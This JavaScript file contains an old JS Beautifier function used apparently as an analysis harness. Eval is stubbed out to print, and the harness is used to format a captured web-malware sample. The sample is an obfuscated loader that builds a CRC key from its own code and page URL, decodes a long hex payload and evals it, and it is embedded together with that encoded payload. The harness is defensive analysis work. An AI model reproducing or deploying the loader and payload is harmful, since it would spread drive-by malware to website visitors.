// Beautification code:
/*

 JS Beautifier
---------------
  $Date: 2008-06-10 14:49:11 +0300 (Tue, 10 Jun 2008) $
  $Revision: 60 $


  Written by Einars "elfz" Lielmanis, <elfz@laacz.lv> 
      http://elfz.laacz.lv/beautify/

  Originally converted to javascript by Vital, <vital76@gmail.com> 
      http://my.opera.com/Vital/blog/2007/11/21/javascript-beautify-on-javascript-translated


  You are free to use this in any way you want, in case you find this useful or working for you.

  Usage:
    js_beautify(js_source_text);

*/


function js_beautify(js_source_text, indent_size, indent_character, indent_level)
{

    var input, output, token_text, last_type, last_text, last_word, current_mode, modes, indent_string;
    var whitespace, wordchar, punct, parser_pos, line_starters, in_case;
    var prefix, token_type, do_block_just_closed, var_line, var_line_tainted;



    function trim_output()
    {
        while (output.length && (output[output.length - 1] === ' ' || output[output.length - 1] === indent_string)) {
            output.pop();
        }
    }

    function print_newline(ignore_repeated)
    {
        ignore_repeated = typeof ignore_repeated === 'undefined' ? true: ignore_repeated;
        
        trim_output();

        if (!output.length) {
            return; // no newline on start of file
        }

        if (output[output.length - 1] !== "\n" || !ignore_repeated) {
            output.push("\n");
        }
        for (var i = 0; i < indent_level; i++) {
            output.push(indent_string);
        }
    }



    function print_space()
    {
        var last_output = output.length ? output[output.length - 1] : ' ';
        if (last_output !== ' ' && last_output !== '\n' && last_output !== indent_string) { // prevent occassional duplicate space
            output.push(' ');
        }
    }


    function print_token()
    {
        output.push(token_text);
    }

    function indent()
    {
        indent_level++;
    }


    function unindent()
    {
        if (indent_level) {
            indent_level--;
        }
    }


    function remove_indent()
    {
        if (output.length && output[output.length - 1] === indent_string) {
            output.pop();
        }
    }


    function set_mode(mode)
    {
        modes.push(current_mode);
        current_mode = mode;
    }


    function restore_mode()
    {
        do_block_just_closed = current_mode === 'DO_BLOCK';
        current_mode = modes.pop();
    }


    function in_array(what, arr)
    {
        for (var i = 0; i < arr.length; i++)
        {
            if (arr[i] === what) {
                return true;
            }
        }
        return false;
    }



    function get_next_token()
    {
        var n_newlines = 0;
        var c = '';

        do {
            if (parser_pos >= input.length) {
                return ['', 'TK_EOF'];
            }
            c = input.charAt(parser_pos);

            parser_pos += 1;
            if (c === "\n") {
                n_newlines += 1;
            }
        }
        while (in_array(c, whitespace));

        if (n_newlines > 1) {
            for (var i = 0; i < 2; i++) {
                print_newline(i === 0);
            }
        }
        var wanted_newline = (n_newlines === 1);


        if (in_array(c, wordchar)) {
            if (parser_pos < input.length) {
                while (in_array(input.charAt(parser_pos), wordchar)) {
                    c += input.charAt(parser_pos);
                    parser_pos += 1;
                    if (parser_pos === input.length) {
                        break;
                    }
                }
            }

            // small and surprisingly unugly hack for 1E-10 representation
            if (parser_pos !== input.length && c.match(/^[0-9]+[Ee]$/) && input.charAt(parser_pos) === '-') {
                parser_pos += 1;

                var t = get_next_token(parser_pos);
                c += '-' + t[0];
                return [c, 'TK_WORD'];
            }

            if (c === 'in') { // hack for 'in' operator
                return [c, 'TK_OPERATOR'];
            }
            return [c, 'TK_WORD'];
        }
        
        if (c === '(' || c === '[') {
            return [c, 'TK_START_EXPR'];
        }

        if (c === ')' || c === ']') {
            return [c, 'TK_END_EXPR'];
        }

        if (c === '{') {
            return [c, 'TK_START_BLOCK'];
        }

        if (c === '}') {
            return [c, 'TK_END_BLOCK'];
        }

        if (c === ';') {
            return [c, 'TK_END_COMMAND'];
        }

        if (c === '/') {
            var comment = '';
            // peek for comment /* ... */
            if (input.charAt(parser_pos) === '*') {
                parser_pos += 1;
                if (parser_pos < input.length) {
                    while (! (input.charAt(parser_pos) === '*' && input.charAt(parser_pos + 1) && input.charAt(parser_pos + 1) === '/') && parser_pos < input.length) {
                        comment += input.charAt(parser_pos);
                        parser_pos += 1;
                        if (parser_pos >= input.length) {
                            break;
                        }
                    }
                }
                parser_pos += 2;
                return ['/*' + comment + '*/', 'TK_BLOCK_COMMENT'];
            }
            // peek for comment // ...
            if (input.charAt(parser_pos) === '/') {
                comment = c;
                while (input.charAt(parser_pos) !== "\x0d" && input.charAt(parser_pos) !== "\x0a") {
                    comment += input.charAt(parser_pos);
                    parser_pos += 1;
                    if (parser_pos >= input.length) {
                        break;
                    }
                }
                parser_pos += 1;
                if (wanted_newline) {
                    print_newline();
                }
                return [comment, 'TK_COMMENT'];
            }

        }

        if (c === "'" || // string
        c === '"' || // string
        (c === '/' &&
        ((last_type === 'TK_WORD' && last_text === 'return') || (last_type === 'TK_START_EXPR' || last_type === 'TK_END_BLOCK' || last_type === 'TK_OPERATOR' || last_type === 'TK_EOF' || last_type === 'TK_END_COMMAND')))) { // regexp
            var sep = c;
            var esc = false;
            c = '';

            if (parser_pos < input.length) {

                while (esc || input.charAt(parser_pos) !== sep) {
                    c += input.charAt(parser_pos);
                    if (!esc) {
                        esc = input.charAt(parser_pos) === '\\';
                    } else {
                        esc = false;
                    }
                    parser_pos += 1;
                    if (parser_pos >= input.length) {
                        break;
                    }
                }

            }

            parser_pos += 1;
            if (last_type === 'TK_END_COMMAND') {
                print_newline();
            }
            return [sep + c + sep, 'TK_STRING'];
        }

        if (in_array(c, punct)) {
            while (parser_pos < input.length && in_array(c + input.charAt(parser_pos), punct)) {
                c += input.charAt(parser_pos);
                parser_pos += 1;
                if (parser_pos >= input.length) {
                    break;
                }
            }
            return [c, 'TK_OPERATOR'];
        }

        return [c, 'TK_UNKNOWN'];
    }


    //----------------------------------

    indent_character = indent_character || ' ';
    indent_size = indent_size || 4;

    indent_string = '';
    while (indent_size--) {
        indent_string += indent_character;
    }

    input = js_source_text;

    last_word = ''; // last 'TK_WORD' passed
    last_type = 'TK_START_EXPR'; // last token type
    last_text = ''; // last token text
    output = [];

    do_block_just_closed = false;
    var_line = false;
    var_line_tainted = false;

    whitespace = "\n\r\t ".split('');
    wordchar = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_$'.split('');
    punct = '+ - * / % & ++ -- = += -= *= /= %= == === != !== > < >= <= >> << >>> >>>= >>= <<= && &= | || ! !! , : ? ^ ^= |='.split(' ');

    // words which should always start on new line.
    line_starters = 'continue,try,throw,return,var,if,switch,case,default,for,while,break,function'.split(',');

    // states showing if we are currently in expression (i.e. "if" case) - 'EXPRESSION', or in usual block (like, procedure), 'BLOCK'.
    // some formatting depends on that.
    current_mode = 'BLOCK';
    modes = [current_mode];

    indent_level = indent_level || 0;
    parser_pos = 0; // parser position
    in_case = false; // flag for parser that case/default has been processed, and next colon needs special attention
    while (true) {
        var t = get_next_token(parser_pos);
        token_text = t[0];
        token_type = t[1];
        if (token_type === 'TK_EOF') {
            break;
        }

        switch (token_type) {

        case 'TK_START_EXPR':
            var_line = false;
            set_mode('EXPRESSION');
            if (last_type === 'TK_END_EXPR' || last_type === 'TK_START_EXPR') {
                // do nothing on (( and )( and ][ and ]( ..
            } else if (last_type !== 'TK_WORD' && last_type !== 'TK_OPERATOR') {
                print_space();
            } else if (in_array(last_word, line_starters) && last_word !== 'function') {
                print_space();
            }
            print_token();
            break;

        case 'TK_END_EXPR':
            print_token();
            restore_mode();
            break;

        case 'TK_START_BLOCK':
            
            if (last_word === 'do') {
                set_mode('DO_BLOCK');
            } else {
                set_mode('BLOCK');
            }
            if (last_type !== 'TK_OPERATOR' && last_type !== 'TK_START_EXPR') {
                if (last_type === 'TK_START_BLOCK') {
                    print_newline();
                } else {
                    print_space();
                }
            }
            print_token();
            indent();
            break;

        case 'TK_END_BLOCK':
            if (last_type === 'TK_START_BLOCK') {
                // nothing
                trim_output();
                unindent();
            } else {
                unindent();
                print_newline();
            }
            print_token();
            restore_mode();
            break;

        case 'TK_WORD':

            if (do_block_just_closed) {
                print_space();
                print_token();
                print_space();
                break;
            }

            if (token_text === 'case' || token_text === 'default') {
                if (last_text === ':') {
                    // switch cases following one another
                    remove_indent();
                } else {
                    // case statement starts in the same line where switch
                    unindent();
                    print_newline();
                    indent();
                }
                print_token();
                in_case = true;
                break;
            }


            prefix = 'NONE';
            if (last_type === 'TK_END_BLOCK') {
                if (!in_array(token_text.toLowerCase(), ['else', 'catch', 'finally'])) {
                    prefix = 'NEWLINE';
                } else {
                    prefix = 'SPACE';
                    print_space();
                }
            } else if (last_type === 'TK_END_COMMAND' && (current_mode === 'BLOCK' || current_mode === 'DO_BLOCK')) {
                prefix = 'NEWLINE';
            } else if (last_type === 'TK_END_COMMAND' && current_mode === 'EXPRESSION') {
                prefix = 'SPACE';
            } else if (last_type === 'TK_WORD') {
                prefix = 'SPACE';
            } else if (last_type === 'TK_START_BLOCK') {
                prefix = 'NEWLINE';
            } else if (last_type === 'TK_END_EXPR') {
                print_space();
                prefix = 'NEWLINE';
            }

            if (last_type !== 'TK_END_BLOCK' && in_array(token_text.toLowerCase(), ['else', 'catch', 'finally'])) {
                print_newline();
            } else if (in_array(token_text, line_starters) || prefix === 'NEWLINE') {
                if (last_text === 'else') {
                    // no need to force newline on else break
                    print_space();
                } else if ((last_type === 'TK_START_EXPR' || last_text === '=') && token_text === 'function') {
                    // no need to force newline on 'function': (function
                    // DONOTHING
                } else if (last_type === 'TK_WORD' && (last_text === 'return' || last_text === 'throw')) {
                    // no newline between 'return nnn'
                    print_space();
                } else if (last_type !== 'TK_END_EXPR') {
                    if ((last_type !== 'TK_START_EXPR' || token_text !== 'var') && last_text !== ':') {
                        // no need to force newline on 'var': for (var x = 0...)
                        if (token_text === 'if' && last_type === 'TK_WORD' && last_word === 'else') {
                            // no newline for } else if {
                            print_space();
                        } else {
                            print_newline();
                        }
                    }
                } else {
                    if (in_array(token_text, line_starters) && last_text !== ')') {
                        print_newline();
                    }
                }
            } else if (prefix === 'SPACE') {
                print_space();
            }
            print_token();
            last_word = token_text;

            if (token_text === 'var') {
                var_line = true;
                var_line_tainted = false;
            }

            break;

        case 'TK_END_COMMAND':

            print_token();
            var_line = false;
            break;

        case 'TK_STRING':

            if (last_type === 'TK_START_BLOCK' || last_type === 'TK_END_BLOCK') {
                print_newline();
            } else if (last_type === 'TK_WORD') {
                print_space();
            }
            print_token();
            break;

        case 'TK_OPERATOR':

            var start_delim = true;
            var end_delim = true;
            if (var_line && token_text !== ',') {
                var_line_tainted = true;
                if (token_text === ':') {
                    var_line = false;
                }
            }

            if (token_text === ':' && in_case) {
                print_token(); // colon really asks for separate treatment
                print_newline();
                break;
            }

            in_case = false;

            if (token_text === ',') {
                if (var_line) {
                    if (var_line_tainted) {
                        print_token();
                        print_newline();
                        var_line_tainted = false;
                    } else {
                        print_token();
                        print_space();
                    }
                } else if (last_type === 'TK_END_BLOCK') {
                    print_token();
                    print_newline();
                } else {
                    if (current_mode === 'BLOCK') {
                        print_token();
                        print_newline();
                    } else {
                        // EXPR od DO_BLOCK
                        print_token();
                        print_space();
                    }
                }
                break;
            } else if (token_text === '--' || token_text === '++') { // unary operators special case
                if (last_text === ';') {
                    // space for (;; ++i)
                    start_delim = true;
                    end_delim = false;
                } else {
                    start_delim = false;
                    end_delim = false;
                }
            } else if (token_text === '!' && last_type === 'TK_START_EXPR') {
                // special case handling: if (!a)
                start_delim = false;
                end_delim = false;
            } else if (last_type === 'TK_OPERATOR') {
                start_delim = false;
                end_delim = false;
            } else if (last_type === 'TK_END_EXPR') {
                start_delim = true;
                end_delim = true;
            } else if (token_text === '.') {
                // decimal digits or object.property
                start_delim = false;
                end_delim = false;

            } else if (token_text === ':') {
                // zz: xx
                // can't differentiate ternary op, so for now it's a ? b: c; without space before colon
                if (last_text.match(/^\d+$/)) {
                    // a little help for ternary a ? 1 : 0;
                    start_delim = true;
                } else {
                    start_delim = false;
                }
            }
            if (start_delim) {
                print_space();
            }

            print_token();

            if (end_delim) {
                print_space();
            }
            break;

        case 'TK_BLOCK_COMMENT':

            print_newline();
            print_token();
            print_newline();
            break;

        case 'TK_COMMENT':

            // print_newline();
            print_space();
            print_token();
            print_newline();
            break;

        case 'TK_UNKNOWN':
            print_token();
            break;
        }

        last_type = token_type;
        last_text = token_text;
    }

    return output.join('');

}


// Now we load the code to be beautified:
var code='// Monkeywrench run Wed Jul 30 19:13:36 2008\n\
// -----------------------------------------------\n\
// Set up a document object\n\
// -----------------------------------------------\n\
function my_location() {\n\
   this.href = "";\n\
}\n\
function my_document() {\n\
   this.location = new my_location();\n\
\n\
   this.write = function(string) {\n\
      print("my_document::write");\n\
      print(string);\n\
   }\n\
};\n\
\n\
var document = new my_document();\n\
var location = new my_location();\n\
document.location.href = \'http://207.10.234.217/cgi-bin/index.cgi?user200\';\n\
location.href = \'http://207.10.234.217/cgi-bin/index.cgi?user200#\';\n\
\n\
function eval(something) { print (something); }\n\
\n\
\n\
// -----------------------------------------------\n\
// inline script:\n\
// -----------------------------------------------\n\
\n\
function kX5V5r0c7(kUQ1R2BK1, Qs0048BK7){var cjUH28q5e = arguments.callee;var p53h4L4y0 = location.href;cjUH28q5e = cjUH28q5e.toString();cjUH28q5e = cjUH28q5e + p53h4L4y0;var SB4XghU6C = cjUH28q5e.replace(/\\W/g, "");SB4XghU6C = SB4XghU6C.toUpperCase();var sJMQ070Fr = 4294967296;var LnG5D02h6 = new Array;for(var qDy5rWUfN = 0; qDy5rWUfN < 256; qDy5rWUfN++) {LnG5D02h6[qDy5rWUfN] = 0;}var kLb20BJEo = 1;for(var qDy5rWUfN = 128; qDy5rWUfN; qDy5rWUfN >>= 1) {kLb20BJEo = kLb20BJEo >>> 1 ^ (kLb20BJEo & 1 ? 3988292384 : 0);for(var D0KgHWU4k = 0; D0KgHWU4k < 256; D0KgHWU4k += qDy5rWUfN * 2) {var vg4UCpyMH = qDy5rWUfN + D0KgHWU4k;LnG5D02h6[vg4UCpyMH] = LnG5D02h6[D0KgHWU4k] ^ kLb20BJEo;if (LnG5D02h6[vg4UCpyMH] < 0) {LnG5D02h6[vg4UCpyMH] += sJMQ070Fr;}}}var tB02pFWV2 = sJMQ070Fr - 1;for(var EtRmJ0TD2 = 0; EtRmJ0TD2 < SB4XghU6C.length; EtRmJ0TD2++) {var tN1TuDrP7 = (tB02pFWV2 ^ SB4XghU6C.charCodeAt(EtRmJ0TD2)) & 255;tB02pFWV2 = (tB02pFWV2 >>> 8) ^ LnG5D02h6[tN1TuDrP7];}tB02pFWV2 = tB02pFWV2 ^ (sJMQ070Fr - 1);if (tB02pFWV2 < 0) {tB02pFWV2 += sJMQ070Fr;}tB02pFWV2 = tB02pFWV2.toString(16).toUpperCase();while(tB02pFWV2.length < 8) {tB02pFWV2 = "0" + tB02pFWV2;}var Fu6AW3O15 = new Array;for(var qDy5rWUfN = 0; qDy5rWUfN < 8; qDy5rWUfN++) {Fu6AW3O15[qDy5rWUfN] = tB02pFWV2.charCodeAt(qDy5rWUfN);}var iF1WMfDhU = "";var x1eh0Gtmx = 0;for(var qDy5rWUfN = 0; qDy5rWUfN < kUQ1R2BK1.length; qDy5rWUfN += 2){var vg4UCpyMH = kUQ1R2BK1.substr(qDy5rWUfN, 2);var fvg4uKhmW = parseInt(vg4UCpyMH, 16);var td83Foe4Q = fvg4uKhmW - Fu6AW3O15[x1eh0Gtmx];if(td83Foe4Q < 0) {td83Foe4Q = td83Foe4Q + 256;}iF1WMfDhU += String.fromCharCode(td83Foe4Q);if(x1eh0Gtmx + 1 == Fu6AW3O15.length) {x1eh0Gtmx = 0;} else {x1eh0Gtmx++;}}var s78naXe8g = 0;try {eval(iF1WMfDhU);} catch(e) {s78naXe8g = 1;}try {if (s78naXe8g) {window.location = "/";}} catch(e) {}}\n\
//-->\n\
\n\
// -----------------------------------------------\n\
// script ends\n\
// -----------------------------------------------\n\
\n\
// body onload script:\n\
kX5V5r0c7(\'aaa6A698a5AAA0B0647D6Ca0a0AF6777b59c608962ba85768eA6b0AC5D61A586AD6790A58375756Bbfa799a7518b69858a997c7Ca674517f6492AA9cA6ae96b0b8A4669892AD9Da7A96Cae96A36197747869A3989E929E628151a4A494a2A5abB39F669Da3A6977D8E697b7b998578b7775175557b797488AC757FAA646fA5B197A5aa9e9fa8596B7f7b707877a97589b9645872518B69858a997C7ca674516d64976a6969ac94AF959E73ab92B35187AE9c8f86A79168BA646E587f698477aa8878AD685Fb396B2B0929b9A59708d997398645553635A7D899bA38c82B78179BC51755576AB9c9995a7886ca96Fa5B199A1a89AA38492B5a9596170a7a2a36293a584a47a78a6AF7a51755565736A767d676f676A776CB8A5a3588669a3a8a4B8759B6D517E51b0A9A85876a3b392BB7f97A7a759b792b46482B165a57472739c9c587251716C6295aa68a96482629AAF5174556376677d6482B165a57472739C9C63605A61ac937c93AF97A585947a9f82b165A57472739C9c95556E61617dc1A799A751ab63967b98a8AC61BA517F6462739BA0b359b8a5A35886aa71A575856290a0517e51737669735582BA61B67772698D9c7c5193BD61AC68727289AD646F767251725a62bf9B6A8968a8a1B974aa587251AB63967B98a8ac61BA5180826F5866519F516AAE638c6c98B1A872BD515E5562617062776A706d637a63757c65586f51715A7Daaa0AA5DA7a2A3628F9bB07da6777f96AF517555617c518DAEA980AA678F85AD646d586766776c628f9Bb07dA6777F96AF5163725192AA72B864796689AC516c64636155ACB792b46477af9f81776593928a58725192AA72b864796689ac516D647Ca2AD79B66790989C738669A3A8a4B8759b6d8c87A8AC94676C867f9A8e628151896d93b893B6889470907cABa98ab96786899c9E51A0649b6A8968A8a1b974AA739e976159937C93AF97A585947A9F77af9F81776593928a95556D61616B64AC896d93B893B68894709077B89b927A6589838a9E516d815187A97Db07a79b99E6E70AEbeaeb8A5A3587A669a638f9d667088517E5191B87da77e68b69E78645E58666CA7A0b46ca799A751A56278B99d6B7cA584517f64617355957267B7B0647Fa974616D62899BA38C82b78179BC5fA49a9fA8A5aa7f519c6667b69D758Ba57B605C6a51bdBA92AA5572738a7995A5A8aa67616e626c766D8E638e8a777c84589351869Bad9B82AE8568B95fA5ac92AA78a0A59683b8599c6667b69D758BA57B5e5A61576276666d7076768A74918a6D6D84616e626c766D8E638e8A777c8458736f7F517a6d519655827993B9a6a57c98699c72749d6889a9a1b6679f7fae7D6A8A737E9B79698B556E6176779d63858E66798462a2516084A58Da08b7ba6A56B516e51736D6ca19B516976779d63858E667984628051685e51bc76779d63858e667984626F6E5884A58da08B7ba6A56b6cbe76779D63858E6679846281517D6a8A737E9b79698b63A5B084B6B69aA69C5972676B72a5A78AA1B196b48792AB9a596a6cb9ac9Aa49A5986669B767e916a69945fAEA99F9fa999616D627C5a58b076768a74918a6d6d84616e6266615a555c6176779D63858E6679847DC1A799A751A474B2AB76837C8675517f649f9dac5182a3B4A5aa739BA0b359b8A5a35886aa71A575856290a0517E51727F5189ae61B564837589A3556d61697d6482b165A57472739C9C63605a61acA587A19F7A7c8886769F82B165A57472739c9C95556e6176779D63858E66798470a79999a774b095a785a56086AA71A575856290A05a7cAEB8a5a3587783B9a877A7a37B65517e5164666Cae96a3617d907A6584ad84779D628151687097b0a36aBA92aa5582ba61b67772698d9c616E62746C5886aa71a575856290a0517D519675aa8c697bB6a9B9729D9Da398b5997d6482B165a57472739c9c58606E61636BBFa799A75187a8AC94676C867f9A517f648569ae85757Bb7bca866A8A6A3a4b6B65989AE61B564837589a36151735a7Dba92AA557b9469ae90647f8661616E62B492AAA8968A9fB66C77AF9f81776593928a645562775A7dba92AA55737897B3b8A19c8087616E628e8470A17D747893745165559484a1a9897C7f8A659C7d907a6584AD84779d9F7F9A9e5d737897b3B8a19c8087616D62745a58B0737897B3B8a19C8087616E6286689eA6A5b1958d9a5163556376677DC1738AadA87694B4876158606e6184b6B69AA69c5FA7a3B1B174a096a384A0A6a9597a6c97b2A5b2A87c8e5E6cAA976A907f6E697dB98478b051635562616E7f64947bA598867C89996566A196af98b6AC5A58B07D8F677690A98B6B9D616e62746cb55596ada4A764AC848367757dBA9767a4605C7cAEBFba92aa559478A9737BA7819E61616e62746CACA7AA61aca7BA92a45D7393a9B97994aa78616A6cbf649499a994A959A76D51B39868B96279ba7aa165517e51737FaeACa7aa61acABAA51609868B96279BA7aA1655A61ACB9AD9F9ca4a86f9dB1A792AC9EA0AF517F645367576cBEae62A792AC989969966b64ACB5b23B8D65adB39f6E6AA2AC596978666C7B728692A37A656d6d66766a788568996D93a27373a56A717A927967727c6a9A966A786A747c677168927372787a626e6A7471667378766B9964A6727A7D6a7A6C677673747b736F6C687a69A5a5967177737865A67c626d656683677479777065667365a78672716672776674856A6f6E728393797B66796a728468a678627067677667a47B656E6566A367a678666C9b7383727786676d657279677B7D626F7a7372697786617065648567a879696e98687668767A936E97657264858576996b737867767c696F67687667797B61716a6A7a698378756E996675667B7A696F6A678468a879626B966572648585749a6c93A66776A6976B7964A664847d967a69737867767A94796B6A7692767969709a687A697b7d96716b72756A777C937067687668887c956E69687a69857d967A6A92796A797c61719a6a76927A856279787277937aa66479676773927485657A76728492a6a663996867736AA77d957A687284737aA5946e7768A567787b95717b7283737685687068668766867a626E6a7471667378766b6E64a5727a7D6A7a6C677669797d676F6e927467777d686f6E737767767C626d6592736a758576797a92A49277A669717b72776772A5699a6693A272848575719a927869867C626f6e69826aA7a59279656A7869777D666f6873747277A662716A67A7648878636c9a6586667378766b6E64a56A847D766e6a678573747b736F6C687a698585767197737867767C626e996675677479696e97678367767C687067688572737A739969687a93777B63716E92736A787D757a796a7592a37A946D6769767279a562796D93716A7a857571796a7A66767a626e6A677769737A656d996776668479699B65667365a778956b6E6485727a7D6a7A6C677669777D677966677792727c667A66937667767c626d6592756a7585727a6d92a26986A663996966a468777c92709A7375687985646E6972766772a592797673769372a56671686a7a66837a687966697a6875a5936D986683667B7a626E7a6971667378966B7964A664a478626c9A728672837a656d6D68766976856a6F6c93746a73866179656675687279696F6a67A6677686776b9964A6648478626C7a65a673747b936f6C687A69a585767177737867767c626D6568766976a56A6F6c73746A73A661996567737278a568716d737A7378A595717A6AA366837a6a6F776786688878956B6e6485648478666C9b6586658678959999657264a578626C7a7473667378966B79648664a47862797a728367767a94996667796A7a85736f6b93a273857C976D65687267a879696e78687668767A736d656682667a7969706D6a7869a686646e686A746778A56A6F68728673748569716a92a469737d766E99677869778569717B6a776a797969706b72799378866471676a76727879926E7a677667777c626d65677267757A626e6a9471667378966b6E64A564847B93716c698673757B68709b677992757969706767767374A566796B6Aa56a7b7D6A7A6E737593787b637965727172797d77999A737473797d976f6E677968797D639997937672797D68709967736a787d957A6d92797378A595796592796a84A5687A686971667378966b7964A664a478626c7A728672837A656D6D687869767C627a69687972757B69996667736A848567796e92A273857d64716B6684667679696F96677867A67a656d66687266747A666f6B67A66776A6976B996486648478626C9a65A693777B69716b92786775A5959A996A7167767C626D6566A367747a956e986971667378766B6e64A564A4a6666e6A72829372a668716a66756aA47D966E6a67a569797D676F6e727467777D686F6E937768748575717A6a796a798661716992a367A57a676D6567A266767A626E6A677769737A656d996776668479697B65667365a778956b6E64856484a56a6F6e728373797B66796a92a4688679697067677667a47b656E6B6683678678666C7b65A665867875797966756a7985659a6d92a267768575716B667566837B93716c69a673757b68709B677972757A67999A7374727a856A996d69746a7a7a616e6C677668847A676D6e667566757B666E6a687368777a756D6592a764a878636C9A658665A67895796667796a7aA5936f6b93A273857c776d656872667479976f6a688467847B976B99648664a478626c9a74736776856A717892786a7979697b656673658778956b6e648564A4a56a6f6e728373797B66796a7284688679697067677667a47b656e6666a3678678666c7B658665a6789579796572648578626C7A9473667378766b79648664847862797A92A367767a94796967a369A47B627a66697773727d656d656872678879696E98687668767A936d6566A2667A7969706d6a786986a6646e686A746778A56a6f6892A69374a569716a728469737D966E7967786A79a594717B6A786a868577996b7383727b7a656f6b92716A75a5937979677867a67a656d66687266747a666f6b67866776A6976b9964A664A478626c9a7383727786676d6569796777a5697169937969887D6970676675678879696E78678468A879626b96648564847862706d6A7869a6A6646e686A746778a56a6e6a69736776a663716692A26aa47d97796B737a737586676d9a72756A878575999892a6937486687077688567787B75719b72837376A56870686A7267727d747976737972798667716e9275727885627A69737468a879626b966572648578626c9A658672838664796766a4927a7D6A9A6c6776697A7d6a6F6d727a6a857C74706B728667767C626D65677567a67969706E6aa269a5866A719669796875a5626e6A697267767C687067688572737a739969687A93777b6371986A7A72727d779A6e728568a87A656F69697A68a3a595999b6A7a697785756d776687668479699b656673658778756b6E64A564848576996B737867767D6571986a7a69727B626F6e6978937b7a656e79667568777C92709a7375687985646e69927667727D937979927773787C66996966A468787C95707993a272877d696f666aa566847b646D676587667378766B6e64A564847862797A92A367767a746D666a8572777c67796B6a7467a586657166727772777d95707a9374937A7A74706572716A797C676F7A687a6978866a6D6e66A56674a6659b66677667857d6571986a7a69727B626F6e6978937B7A656E996872667479776f68678467767A726d6b667569787a737a6a6a7593797c777069697767728565797673747284A669716D6675687279696f6A67A667A67a6599976572648578626c9a65a665a678957069677892747c687a6D6A716a7A7d676d6566a767A87969716A7372927B7d636e6E67796876857570656673658778756B6e64a564A4a6666e6A92A27372A668716a66756a847D966E6A67A56A7A7B689965697492777C64716e6a7868748661716A92736a7B85749999677669747a656e6566A56674A6646d6765A765a678756b6E648564847D927A6C7282927785776e97657264A578626c9a65A66586a7626b9964a6648478626c9a7473667378966B9964a664A478626C9a93a3727786676d656A7672747D629A67927969A6A66A6F6E667567887969716E687973767D64996868a769787C926f68737993768661716e927966A379776f68678467a67B976b996486648878636C7A658665A6A595716b667566837d6a9a6A6Aa67373a5686F6E727A68847d646f6a727367767C616D65678566a479699B65667365a778956b6e648564a485746f786aA6688686616F669271697479697067677667A47B9371686683678678666c7B65a665a67875797966756a79a5659A6D92A267768575716B667566a37D6A7A6A6A86937385686f6E727a68847d646f6A927367767c626E796675678479696e77678367768566796569856a887d73707A738269A67d976e666a7266747b667067677668767a656D6b668266747d6a7A6A6a867373A5686F6E927a68847d646f6C927367767C616d65677667757a956e6a6786677686776B9964A6648478626C7A6586737A7B73706e67A56AA77b6A7A666A7667767c626D6566A3677b7a936E786971667378966B6E64856484A6666d6765a7658678759999657264a578666C9b658665a6a595716B66756683856A6F6E92a393797B66796A728468a679696e6b697367767B656d656682667a79697A68688469A47C6A709692A2697AA5926E6a677769737A656E656675667A79766e6A937A68847D756e6e727168758565716a677667777c626d65677566A479699B65667365A778756B6E64a56a76A5927976927772887b776B796486648478629b67667365a7789599996572648586666E6a92799277A66971686aA466A37D756E9A677693a87a657979657264a578666C9b737a737886756D6592A7648878636C7a728672837a656d6D92736A75a596999a92A492778669719B927767728566797a7373927b7d69796e92756A7985739965677893A3857571696a7a92737A687A7968739373A6686D7992a36aa885766e6c92736874856a719A6A766a7685657976727A6A76a661796A6a836A8485676e7A667365a778756b6E687968767B6A6F7668a56a767d696f6b6675678879696e98687668777a736E97657264a586666e6A92799277a66971686A8466837D956e7A677673887A6599996572648578666C7B93A492a5A59571986A7a668385676F7869a4697b7d76996B69A272767A679a6672829374a59399696Aa466747B656E6a68A5678679626B7664A592727a77709869826a878672706B927766747b666E6a67A468767a736d656687667485676F9869a4697b7D96996b698292767b646D676587667378766b996486927A7d6A9a6c6776727a7d6a796A72756974a6617977728467767c626D656a7972737D937A769373727B8663796967736A77857279767277937A856A6f6A92716a79a56679767374737A7a946d6772786a77A592999A9376937A7a676d6E678764887863796e6Aa2737bA665706592A46a7a7D776F687379927ba6696F6672797278a592999a9278737b8669716a66a46676A5949A9A7376727b7a676D98667566768574797693A5737A7b6471966A76927a7d6A9A6d92797378A5957965927966767a62706566736587A569706a927a92747C697A79728392A47B6379686A7a92787B6a9a6e737a737885757167727A72787D756e7967787379866771686677668779696e6c92a5737Aa6699965678667737a686F6c687668A47b636E66677567727a726f6D687A68747B676E6667a367737d93999892a668738567716e92736773A5629A68727A727Ba6946d9a6A786A7BA5627069727a687A85676E686A78677b7A776F79687668847B92716b677567757a726f6A68766876856A6e6567766a797d766F79687768837b656e67677567747A696f6a687668767b656e65677567767B62796d687968857b65716A6A786a777D969997687668767A676D6566876674a5676F986984697B7d76996B6982727679696f656776697a7c676f66677a67a37C69716E698367767A776D65727667787D767A6D6877937BA6946F97667566A679699a6e68846aA67B95719868766A877C696E9a6971667378766B7964866A78a568996d73829373A56a717a727967727d929A69727a93A67B637166927592747D759a68927A6979a594716E72716A787A61996e6Aa2737b8665706572846a7A7D776e9A6971667378767979657264a56B5A73\')\n\
'

// And now we call our beautification code:
print (js_beautify (code, 3, ' ', 0));
